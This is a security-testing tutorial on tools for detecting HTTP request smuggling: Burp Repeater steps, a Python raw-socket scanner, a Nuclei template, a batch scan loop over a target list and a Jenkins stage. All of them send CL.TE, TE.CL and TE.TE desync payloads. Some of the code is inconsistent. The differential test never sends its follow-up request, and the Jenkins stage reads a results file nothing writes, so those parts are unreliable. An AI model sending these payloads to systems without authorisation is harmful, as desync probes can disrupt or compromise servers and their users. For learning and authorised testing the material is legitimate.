# Tool Integration - Automation untuk Maksimal Efficiency

---

## Tool Landscape

| Tool | Best For | Cost |
|------|----------|------|
| Burp Suite | Interactive testing, custom macros, repeater | $399/year (Community free) |
| HTTP Request Smuggler | Burp extension, automated detection | Free (plugin) |
| Custom Python Script | Batch testing, parallelization | Free |
| Nuclei | Template-based scanning | Free |
| OWASP ZAP | Open-source alternative | Free |

**Recommendation:** Burp Suite Community + custom Python scripts

---

## Burp Suite Repeater Workflow

### Setup

1. **Capture baseline request**
   - Navigate to target URL
   - Intercept GET request
   - Send to Repeater

2. **Create attack request**
   - Duplicate request
   - Modify for CL.TE attack
   - Keep connection: keep-alive

### CL.TE Test in Burp

```
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked
Connection: keep-alive

1
A
X
```

**Observe:**
- Response tab: Check if request hangs/times out (5+ seconds)
- Timing: Bottom right shows response time
- Color: Red indicates timeout

### Differential Response Test in Burp

```
Request 1 (in Repeater Tab 1):
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked
Connection: keep-alive

1
A
0

GET /nonexistent HTTP/1.1
Host: target.com

Request 2 (in Repeater Tab 2, immediately after):
GET / HTTP/1.1
Host: target.com
```

**Process:**
1. Click "Send" on Request 1
2. Wait 1 second
3. Click "Send" on Request 2
4. Compare responses in Repeater

**Expected:**
- Response 1: 200 OK (to POST /)
- Response 2: 404 NOT FOUND (to GET /nonexistent)

If Response 2 shows 404 → VULNERABLE

---

## HTTP Request Smuggler Extension

### Installation

```
1. Burp Suite → Extensions → BApp Store
2. Search "HTTP Request Smuggler"
3. Install (by PortSwigger)
```

### Usage

1. **Highlight request in Burp history**
2. **Right-click → Extensions → HTTP Request Smuggler**
3. **Select variant:** CL.TE, TE.CL, TE.TE, H2.CL, etc.
4. **Tool runs automated tests**
5. **Results shown in "Issues" tab**

### Interpreting Results

```
Status: Confirmed
Vulnerability: CL.TE Request Smuggling
Severity: Critical
Evidence:
- Request successfully smuggled
- Backend desynchronization confirmed
```

---

## Custom Python Script for Batch Testing

Save as `request-smuggling-scanner.py`:

```python
#!/usr/bin/env python3
import socket
import sys
import time
import re
from concurrent.futures import ThreadPoolExecutor

class RequestSmugglingScanner:
    def __init__(self, target, port=443, use_https=True):
        self.target = target
        self.port = port
        self.use_https = use_https
        self.results = {
            'cl_te': False,
            'te_cl': False,
            'te_te': False,
            'confidence': 0
        }
    
    def send_raw_request(self, request_data, timeout=10):
        """Send raw HTTP request and capture response"""
        try:
            if self.use_https:
                import ssl
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = socket.create_connection((self.target, self.port), timeout)
                sock = context.wrap_socket(sock, server_hostname=self.target)
            else:
                sock = socket.create_connection((self.target, self.port), timeout)
            
            sock.sendall(request_data.encode() if isinstance(request_data, str) else request_data)
            response = b""
            sock.settimeout(timeout)
            
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
            except socket.timeout:
                pass  # Expected for some tests
            
            sock.close()
            return response.decode('utf-8', errors='ignore')
        
        except socket.timeout:
            return "TIMEOUT"
        except Exception as e:
            return f"ERROR: {str(e)}"
    
    def test_cl_te(self):
        """Test CL.TE vulnerability"""
        print("[*] Testing CL.TE...")
        
        request = f"""POST / HTTP/1.1\r
Host: {self.target}\r
Content-Length: 4\r
Transfer-Encoding: chunked\r
Connection: keep-alive\r
\r
1\r
A\r
X"""
        
        start = time.time()
        response = self.send_raw_request(request, timeout=10)
        elapsed = time.time() - start
        
        if elapsed > 5:
            print(f"[+] CL.TE: VULNERABLE (timeout: {elapsed:.1f}s)")
            self.results['cl_te'] = True
            self.results['confidence'] += 30
        elif "TIMEOUT" in response:
            print(f"[+] CL.TE: LIKELY VULNERABLE (timeout)")
            self.results['cl_te'] = True
            self.results['confidence'] += 20
        else:
            print(f"[-] CL.TE: Not vulnerable (response: {elapsed:.1f}s)")
    
    def test_te_cl(self):
        """Test TE.CL vulnerability"""
        print("[*] Testing TE.CL...")
        
        request = f"""POST / HTTP/1.1\r
Host: {self.target}\r
Transfer-Encoding: chunked\r
Content-Length: 6\r
Connection: keep-alive\r
\r
0\r
\r
X"""
        
        start = time.time()
        response = self.send_raw_request(request, timeout=10)
        elapsed = time.time() - start
        
        if elapsed > 5:
            print(f"[+] TE.CL: VULNERABLE (timeout: {elapsed:.1f}s)")
            self.results['te_cl'] = True
            self.results['confidence'] += 30
        else:
            print(f"[-] TE.CL: Not vulnerable (response: {elapsed:.1f}s)")
    
    def test_te_te_obfuscation(self):
        """Test TE.TE with obfuscation"""
        print("[*] Testing TE.TE variants...")
        
        variants = [
            ("xchunked", f"Transfer-Encoding: xchunked\r\nTransfer-Encoding: chunked"),
            ("spaced", f"Transfer-Encoding: chunked\r\nTransfer-Encoding: [space]chunked"),
        ]
        
        for name, te_headers in variants:
            request = f"""POST / HTTP/1.1\r
Host: {self.target}\r
{te_headers}\r
Connection: keep-alive\r
\r
0\r
\r
X"""
            
            response = self.send_raw_request(request, timeout=5)
            if "TIMEOUT" in response or len(response) == 0:
                print(f"[+] TE.TE ({name}): Possible")
                self.results['confidence'] += 15
    
    def test_differential_response(self):
        """Test via differential response (404 injection)"""
        print("[*] Testing differential response...")
        
        # This requires special handling - testing concept
        request = f"""POST / HTTP/1.1\r
Host: {self.target}\r
Content-Length: 4\r
Transfer-Encoding: chunked\r
\r
1\r
A\r
0\r
\r
GET /nonexistent-test-xyz HTTP/1.1\r
Host: {self.target}\r
\r
"""
        
        response = self.send_raw_request(request, timeout=10)
        
        # Then send normal request and check if 404 in response
        if "404" in response or "Not Found" in response:
            print("[+] Differential response: CONFIRMED")
            self.results['confidence'] += 35
        else:
            print("[-] Differential response: Not confirmed")
    
    def scan(self):
        """Run all tests"""
        print(f"\n[*] Scanning {self.target}:{self.port}")
        print("=" * 50)
        
        # Run tests in parallel
        with ThreadPoolExecutor(max_workers=3) as executor:
            executor.submit(self.test_cl_te)
            executor.submit(self.test_te_cl)
            executor.submit(self.test_te_te_obfuscation)
        
        self.test_differential_response()
        
        print("\n" + "=" * 50)
        print(f"\n[*] Scan Results for {self.target}")
        print(f"    CL.TE Vulnerable: {self.results['cl_te']}")
        print(f"    TE.CL Vulnerable: {self.results['te_cl']}")
        print(f"    Confidence Score: {self.results['confidence']}/100")
        
        if self.results['confidence'] >= 75:
            print("\n[!] TARGET LIKELY VULNERABLE - INVESTIGATE FURTHER")
        elif self.results['confidence'] >= 50:
            print("\n[!] Possible vulnerability - requires manual confirmation")
        else:
            print("\n[-] No clear vulnerability detected")
        
        return self.results

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 request-smuggling-scanner.py <target> [port]")
        print("Example: python3 request-smuggling-scanner.py example.com 443")
        sys.exit(1)
    
    target = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 443
    
    scanner = RequestSmugglingScanner(target, port)
    scanner.scan()
```

### Usage

```bash
python3 request-smuggling-scanner.py target.com 443
python3 request-smuggling-scanner.py target.com 80

# Output:
# [*] Scanning target.com:443
# [*] Testing CL.TE...
# [+] CL.TE: VULNERABLE (timeout: 7.2s)
# [*] Testing TE.CL...
# [-] TE.CL: Not vulnerable
# ...
# [!] TARGET LIKELY VULNERABLE - INVESTIGATE FURTHER
```

---

## Nuclei Template for Automation

Save as `http-request-smuggling.yaml`:

```yaml
id: http-request-smuggling-clte
info:
  name: HTTP Request Smuggling (CL.TE)
  author: bug-hunter
  severity: critical
  description: "Detects HTTP Request Smuggling via CL.TE desynchronization"
  reference:
    - https://portswigger.net/research/http-request-smuggling

requests:
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 4
        Transfer-Encoding: chunked
        Connection: keep-alive

        1
        A
        X

    matchers:
      - type: dsl
        dsl:
          - 'duration > 5'  # If request takes >5 seconds
        condition: and

    attack: clusterbomb
    payloads:
      path:
        - "/"
        - "/api"
        - "/admin"
      method:
        - POST
```

### Usage

```bash
nuclei -t http-request-smuggling.yaml -u https://target.com
```

---

## Batch Scanning Script

```bash
#!/bin/bash
# batch-scan.sh - Scan multiple targets

TARGETS_FILE="targets.txt"
OUTPUT_DIR="results"
mkdir -p $OUTPUT_DIR

while read target; do
    echo "[*] Scanning $target..."
    python3 request-smuggling-scanner.py "$target" 443 > "$OUTPUT_DIR/$target.txt" 2>&1
    
    # Check if vulnerable
    if grep -q "VULNERABLE" "$OUTPUT_DIR/$target.txt"; then
        echo "[!] $target is VULNERABLE!"
        cp "$OUTPUT_DIR/$target.txt" "$OUTPUT_DIR/VULNERABLE-$target.txt"
    fi
done < $TARGETS_FILE

echo "[+] Scan complete. Vulnerable targets in $OUTPUT_DIR/"
```

---

## Integration with Burp Suite Collaborator

For blind testing (no direct response visible):

1. **Generate Burp Collaborator payload**
   ```
   burp-collaborator-public.oas-collaborators.com
   ```

2. **Inject into smuggle request**
   ```
   GET / HTTP/1.1
   Host: {{COLLABORATOR_DOMAIN}}
   ```

3. **Monitor for callback**
   - Burp Client → Collaborator
   - Any DNS/HTTP request from target = VULNERABLE

---

## Jenkins CI/CD Integration

For continuous scanning:

```groovy
pipeline {
    stages {
        stage('Request Smuggling Scan') {
            steps {
                sh '''
                    python3 request-smuggling-scanner.py ${TARGET_HOST} ${TARGET_PORT}
                '''
            }
        }
        stage('Report Results') {
            steps {
                script {
                    if (fileExists('results.json')) {
                        // Parse results, alert if vulnerable
                        sh 'cat results.json | jq .'
                    }
                }
            }
        }
    }
}
```

---

## Tool Comparison Matrix

| Feature | Burp | Custom Script | Nuclei |
|---------|------|---------------|--------|
| Automation | ⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ |
| Accuracy | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐ |
| Speed | ⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
| Learning Curve | ⭐⭐ | ⭐⭐⭐ | ⭐ |
| Cost | $399 | Free | Free |

**Recommendation:** Start with Burp Repeater (learning), graduate to Python script (speed), use Nuclei for mass scanning.

